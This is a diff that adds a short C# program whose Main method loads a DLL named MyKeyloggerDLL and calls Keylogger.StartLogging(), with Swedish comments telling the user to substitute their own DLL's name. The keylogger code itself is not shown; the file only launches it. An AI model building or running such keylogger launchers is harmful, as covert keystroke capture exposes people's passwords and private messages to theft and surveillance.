@@ -1,0 +1,14 @@
+using System;
+using MyKeyloggerDLL; // Ersätt med namnet på din DLL
+
+namespace MyMainApp
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            // Använd funktioner eller klasser från DLL
+            Keylogger.StartLogging();
+        }
+    }
+}
